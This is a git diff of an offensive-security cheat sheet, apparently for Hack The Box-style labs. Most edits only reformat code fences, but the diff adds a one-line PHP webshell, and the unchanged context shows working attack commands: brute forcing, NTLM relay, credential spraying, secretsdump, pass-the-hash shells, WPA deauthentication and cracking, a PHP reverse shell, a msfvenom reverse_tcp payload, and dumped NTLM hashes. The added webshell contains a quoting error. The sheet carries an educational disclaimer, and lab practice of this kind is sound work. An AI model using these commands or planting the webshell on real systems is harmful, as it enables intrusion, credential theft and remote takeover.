@@ -30,6 +30,7 @@
 29. [PowerShell](#PowerShell)
 30. [Oracle](#Oracle)
 31. [Memory Analysis](#Memory-Analysis)
+32. [Upload Bypass](#Upload-Bypass)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -81,24 +82,24 @@ qemu-system-x86_64 vm.raw -m 1024 # -m for specifying RAM
 * Remmina (apt install remmina)
 
 ## Log commands into file
-```bash
+```
 screen cmd.log
 exit
 ```
 
 ## Fix VPN routing issue (HTB)
 
-```bash
+```
 fixvpn='sudo route del -net 10.10.10.0 gw 10.10.14.1 netmask 255.255.255.0 dev tun0'
 ```
 
 ## SimpleHTTPServer
 
-```bash
+```
 python -m SimpleHTTPServer
 ```
 
-```bash
+```
 python3 -m http.server 8080
 ```
 
@@ -111,6 +112,11 @@ python3 -m http.server 8080
 ## Password List
 
 :information_source: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+
+## very simple PHP webshell
+```
+<?php system($_GET["cmd]);?>
+```
 
 # Port Scanning
 
@@ -125,7 +131,7 @@ for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -
 # Brute Forcing
 ## hydra
 
-```bash
+```
 hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
 ```
 
@@ -140,12 +146,12 @@ wfuzz --hc 404 -c -z file,big.txt http://10.10.26.165/site-log.php\?date=FUZZ
 # Cracking
 ## Example MD5 Hash
 
-```bash
+```
 hashcat --example-hashes | grep MD5 -C 4
 hashcat -m 500 hash rockyou.txt
 ```
 
-```bash
+```
 hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
 ```
 
@@ -203,7 +209,7 @@ responder -I eth0 -rdwv
 
 Open a second terminal and run:
 
-```bash
+```
 ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
@@ -231,7 +237,7 @@ mitm6 -d whiterose.local
 
 Open a second terminal and run:
 
-```bash
+```
 ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfile
 ```
 
@@ -354,7 +360,7 @@ Transfer the zip file to kali instance and load it into bloodhound to visualize.
 
 You can spray credentials in an AD network using crackmapexec:
 
-```bash
+```
 crackmapexec 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
 ```
 
@@ -362,7 +368,7 @@ crackmapexec 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
 
 :information_source: secretsdump.py is part of the impacket toolkit
 
-```bash
+```
 secretsdump.py whiterose/ealderson:Password123@192.168.92.131
 ```
 
@@ -370,13 +376,13 @@ secretsdump.py whiterose/ealderson:Password123@192.168.92.131
 
 Use NTHASH (LMHASH:NTHASH)
 
-```bash
+```
 crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
 ```
 
 ## Shell Access Whith NTLM Hash
 
-```bash
+```
 psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
 ```
 
@@ -384,7 +390,7 @@ psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
 
 Get a meterpreter session (e.g. smb/psexec).
 
-```bash
+```
 meterpreter> load incognito
 meterpreter> list tokens
 meterpreter> impersonate_token marvel\\administrator
@@ -424,7 +430,7 @@ GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -requ
 
 Get Groups.xml from SYSVOL or \Replication share and check for cPassword.
 
-```bash
+```
 gpp-decrypt <cPassword-Hash>
 ```
 
@@ -462,20 +468,20 @@ mimikatz # misc::cmd
 
 # Web Application Enumeration
 
-```bash
+```
 gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
 ```
 
 Install golang and add the following two lines to ~/.bashrc (or ~/.profiles)
 
-```bash
+```
 export GOPATH=$HOME/go
 export PATH=$PATH:$GOPATH/bin		
 ```
 
 ## [Assetfinder](https://github.com/tomnomnom/assetfinder)
 
-```bash
+```
 go get -u github.com/tomnomnom/assetfinder
 ```
 
@@ -483,13 +489,13 @@ go get -u github.com/tomnomnom/assetfinder
 
 ## [Httprobe](https://github.com/tomnomnom/httprobe) (find alive domains)
 
-```bash
+```
 go get -u github.com/tomnomnom/httprobe
 ```
 
 ## [GoWitness](https://github.com/sensepost/gowitness) (Screenshotting Websites)
 
-```bash
+```
 go get -u github.com/sensepost/gowitness
 ```
 
@@ -521,34 +527,34 @@ Basic idea: upload an xml to test if it gets parsed and then abusing the doctype
 # Wifi Hacking
 
 ## WPS Pin Recovery
-```bash
+```
 reaver -i wlan0mon -b 9C:AD...(network-target-mac) -c 1 (channel 1) -f (fixed:one channel) -a -w(win7 register art) -v (verbose) -K 1 (Pixie-attack: hit common pins)
 #if Pixie (-K 1 doesnt work, run -vv (very verbose))
 ```
 
 ## Capture WPA/WPA2 Handshake
-```bash
+```
 ifconfig wlan0 down
 macchanger -r wlan0
 ifconfig wlan0 up
 ```
-```bash
+```
 airmon-ng
 airmon-ng check
 airmon-ng check kill
 airmon-ng start wlan0
 ```
-```bash
+```
 airodump-ng wlan0mon [--bssid F0:7B.... where F0:7B.. is mac of "target-router"][--channel 11][--write Desktop/path/to/my/file]
 ```
-```bash
+```
 aireplay-ng wlan0mon [--deauth 2000 (sending 2000 deauth packages)][-a F0:7B.. (-a: Accesspoint:Macadress of router)][-c F9:2D..(-c:Client: Macadress of target)]
 #sending deauth packages to force a handshake
 ```
 
 ## Crack WPA/WPA2 Handshake
 
-```bash
+```
 aircrack-ng Path/to/my/captureFile/with/handshake.cap -w /Path/to/my/password/list.txt
 ```
 
@@ -824,7 +830,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
  
 ## Using msfvenom 
 
-```bash
+```
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
 ```
 
@@ -924,11 +930,11 @@ if __name__ == "__main__":
 # SSL
 ## Check if Private Key matches Certificate
 
-```bash
+```
 openssl x509 -noout in serct.crt | md5sum
 ```
 
-```bash
+```
 openssl rsa -noout in key.key | md5sum	
 ```
 
@@ -944,24 +950,24 @@ openssl x509 -text -noout -in crt.crt
 
 ## Generate new Private Key and Certificate Signing Request (CSR)
 
-```bash
+```
 openssl req -out CSR.csr -new -newkey rsa:4096 -nodes -keyout key.key
 ```
 
 ## Sign a CSR
-```bash
+```
 openssl x509 -req -sha256 -days 1000 -in server.csr -signkey server.key -out server.pem
 ```
 
 ## Generate a self-signed Certificate
 
-```bash
+```
 openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:4096 -keyout key.key -out crt.crt
 ```
 
 ## Verify (python3 https server)
 First create .pem file with .crt and .key
-```bash
+```
 cat crt.crt key.key > pem.pem
 ```
 Then run the following script
@@ -980,7 +986,7 @@ httpd.serve_forever()
 
 # Shell Shock
 ## CVE-2014-6271
-```bash
+```
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 ```
 
@@ -1443,7 +1449,5 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
 ```
-
-
 
 
